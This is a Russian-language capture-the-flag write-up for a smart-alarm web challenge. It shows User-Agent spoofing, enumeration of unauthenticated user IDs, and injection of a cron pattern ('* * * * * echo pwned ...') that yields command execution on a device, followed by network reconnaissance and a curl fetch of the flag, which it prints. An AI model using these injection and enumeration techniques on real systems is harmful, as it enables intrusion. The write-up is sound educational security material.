# Будильник: Write-up

Заходим на сайт и видим, что нас просят зайти с Android-устройства. Открываем код страницы и видим, что ровно такой HTML нам и приходит.

Ладно.

Достаем телефон, открываем сайт там. Видим QR-сканер, с помощью которого можно отсканировать данные в условии QR-код. Опции отсканировать QR из файла при этом нет.

![Scan QR](writeup/index.jpg)

Сканируем код и попадаем на страницу управления таймерами. Здесь пустовато.

![Alarm UI](writeup/alarmui.jpg)

Но можно и добавить таймер, тыкнув на синюю кнопку снизу. При этом откроется интерфейс, до боли похожий на типичный дизайн от Google. Ага, понятно, вот почему требуется Android.

![Add alarm](writeup/add.jpg)

![Alarm UI with timer added](writeup/withtimer.jpg)

Для дальнейшего анализа нам явно понадобится десктоп, а у кого-то и Android может не быть, так что разберемся, как загрузить сайт с компьютера. Даже если он не будет работать, мы хотя бы сможем почитать код.

Домашняя страница отдает следующий HTML:

```html
<!DOCTYPE html>
<html>
	<head>
		[удалено для краткости]
	</head>
	<body>
		<h1>smartAlarm</h1>

		<p>Please use this app on Android only.</p>
	</body>
</html>
```

Как сервер определяет, Android ли использует клиент? Вероятно, по User-Agent. Попробуем заменить браузерный User-Agent на Android'овский. В Firefox, например, можно воспользоваться [расширением](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/). И да, текст заменяется на "Scan your smartAlarm QR." — тот же, что был на телефоне! Посмотрим на код теперь:

```html
<!DOCTYPE html>
<html>
	<head>
		[удалено для краткости]
	</head>
	<body>
		<h1>smartAlarm</h1>

		<p>Scan your smartAlarm QR.</p>
		<div id="reader"></div>

		<script type="text/javascript">
			const html5QrCode = new Html5Qrcode("reader");
			html5QrCode.start({facingMode: "environment"}, {fps: 10, qrbox: {width: 250, height: 250}}, text => {
				if (text.startsWith("smartAlarm ")) {
					for (const param of text.split(" ").slice(1)) {
						const [_, key, value] = param.match(/^(\w+)=(\w+)$/);
						localStorage[key] = value;
					}
					html5QrCode.stop();
					location.href = "alarmui";
				}
			});
		</script>
	</body>
</html>
```

Итак, при сканировании QR-кода устанавливаются переменные в [LocalStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage) и происходит переход на страницу `alarmui`. В данном нам QR-коде записана строка `smartAlarm uid=7`, что можно определить любым сторонним сканнером.

Хмм... 7 — маленькое число, да и проверок пароля нигде не было. UID — явно User ID. Может быть, есть еще пользователи? Попробуем поперебирать: 0, 1, 2, ... Для каждого UID'а сгенерируем QR-код руками и отсканируем его через сайт; либо можно напрямую из браузера установить переменную в LocalStorage и открыть `alarmui`. На большинстве UID'ов сайт выдает ошибку `Invalid UID`, но на uid=2 и uid=7 он не ругается. 7 — тестовый аккаунт, как следует из описания задания, а вот аккаунтом под номером 2 кто-то даже пользуется: там уже стоит будильник на 9 часов утра. Вот он, основатель Smart Alarm!

В [коде alarmui](controller/templates/alarmui.html) много интересного, но больше всего в глаза бросается [код Konami](https://ru.m.wikipedia.org/wiki/%D0%9A%D0%BE%D0%B4_Konami):

```html
...
<script type="text/javascript" src="https://zbic.in/konami-code-js/konami-code.js"></script>
...
<script type="text/javascript">
...
document.addEventListener("konamiCode", async () => {
	alert((await api("get-diagnostics")).logs);
});
</script>
...
```

Здесь используется сторонняя реализация распознавателя кода. Прям по ссылке https://zbic.in/konami-code-js написано, как ей пользоваться и на десктопе, и на телефоне. Введем код *где-нибудь* и получим интересные логи:

```
Fetching /home/alarm/logs from the device...
```

Пустовато. Нету логов.

Может, их нужно триггернуть? Кажется, 9 утра было давно. Добавим новый таймер на следующую минуту... добавим... возможно, в этот момент добавить таймер не получится, потому что интерфейс только на Android нормально работает. В этом случае придется вызывать JavaScript-функцию руками.

Добавили, подождали пару минут... и нет, в логах ничего не появилось. Перечитываем условие. Ах да, "англосаксонские партнеры". В Великобритании время другое, там UTC. Забиваем время по UTC, ждем еще... и оно срабатывает:

```
Fetching /home/alarm/logs from the device...
alarm! at Sun Feb 11 16:48:00 UTC 2024
```

Логн, допустим, работают, но как это поможет достать флаг? Хмм... код на JS генерирует какую-то явно странную строку. Минуты, потом часы, звездочки, дни недели ещё... что это за формат? А это формат [cron](https://en.m.wikipedia.org/wiki/Cron). Это подтверждает и то, что в условии дана фотография Raspberry Pi, на котором обычно запускают легковесный Linux.

Может ли быть такое, что эта строка подставляется напрямую в `crontab`? Например, `[паттерн] echo "alarm! at $(date)" >>/home/alarm/logs` или что-то в этом духе. Давайте попробуем! Добавим через API паттерн `* * * * * echo pwned >>/home/alarm/logs` и посмотрим, что случится. Это можно делать и с десктопа: на API проверки User-Agent не распространяются. Ждем минуту, и...

```
Fetching /home/alarm/logs from the device...
alarm! at Sun Feb 11 16:48:00 UTC 2024
pwned ring-alarm
```

Откуда `ring-alarm`? А, понятно, это после нашего паттерна дописалась команда `ring-alarm`, это надо иметь в виду. Но RCE есть, а значит, мы близки к решению!

Флаг. Нам нужен флаг. Флаг, согласно условию, на ноутбуке основателя компании. А мы код запускаем не на ноутбуке, а на часах. Как они вообще могут быть связаны? Соединены? Конечно, локальной сетью! Наверняка они подключены к одному Wi-Fi. Проверяется это легко — запуском `ip address`:

```
Fetching /home/alarm/logs from the device...
alarm! at Sun Feb 11 16:48:00 UTC 2024
pwned ring-alarm
pwned ring-alarm
pwned ring-alarm
pwned ring-alarm
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: local: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN qlen 1000
    link/ether 02:98:b0:88:f9:cf brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.2/24 scope global local
       valid_lft forever preferred_lft forever
    inet 192.168.1.3/24 scope global secondary local
       valid_lft forever preferred_lft forever
alarm! at Sun Feb 11 16:56:00 UTC 2024
pwned ring-alarm
```

`local`? Явно не совсем то, что ожидается от Wi-Fi, но какие-то интересные IP тут есть. Посмотрим, есть ли на них что-то, командой `curl 192.168.1.2 192.168.1.3`. Ага!

```html
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="flag.txt">flag.txt</a></li>
</ul>
<hr>
</body>
</html>
```

Правда, непонятно, какой из двух IP это выдал, но попробуем файл `flag.txt` также забрать с обоих: `curl 192.168.1.2/flag.txt 192.168.1.3/flag.txt`. Через минуту в логах появляется флаг.

Флаг: **ugra_time_to_get_up_9meeeputuudi**
